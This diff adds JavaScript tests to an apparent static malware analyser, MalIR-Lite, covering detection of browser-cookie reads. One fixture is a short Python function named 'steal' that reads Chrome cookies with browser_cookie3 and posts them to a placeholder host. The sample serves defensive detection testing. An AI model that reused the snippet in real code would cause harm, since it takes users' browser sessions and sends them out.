@@ -539,3 +539,48 @@ test("legacy urlopen and startfile retain coarse browser capabilities", () => {
   assert.ok(report.events.some((event) => event.op === "NETWORK_RECEIVE"));
   assert.ok(report.events.some((event) => event.op === "PROCESS_EXEC"));
 });
+
+
+test("browser cookie APIs remain proximity-only in MalIR-Lite", () => {
+  const report = analyzeSource(
+    `def steal():
+    cookies = browser_cookie3.chrome(domain_name="example.com")
+    requests.post("https://example.invalid/t", json={"cookies": str(cookies)})
+`,
+    "cookies.py",
+  );
+  assert.ok(report.events.some((event) => event.op === "BROWSER_COOKIE_READ"));
+  assert.ok(
+    report.modelTokens.includes(
+      "PATH:browser_session_transfer|K:proximity|Q:low",
+    ),
+  );
+  assert.ok(report.modelTokens.includes("EFFECT:ORIGIN:browser_session"));
+  assert.equal(
+    report.modelTokens.includes("EFFECT:FLOW:browser_session_to_network"),
+    false,
+  );
+});
+
+
+test("browser cookie detection requires the qualified library API", () => {
+  const custom = analyzeSource(
+    `def run():
+    value = custom.chrome()
+`,
+    "custom.py",
+  );
+  assert.equal(
+    custom.events.some((event) => event.op === "BROWSER_COOKIE_READ"),
+    false,
+  );
+  const aliased = analyzeSource(
+    `import browser_cookie3 as bc
+
+def run():
+    value = bc.firefox()
+`,
+    "alias.py",
+  );
+  assert.ok(aliased.events.some((event) => event.op === "BROWSER_COOKIE_READ"));
+});
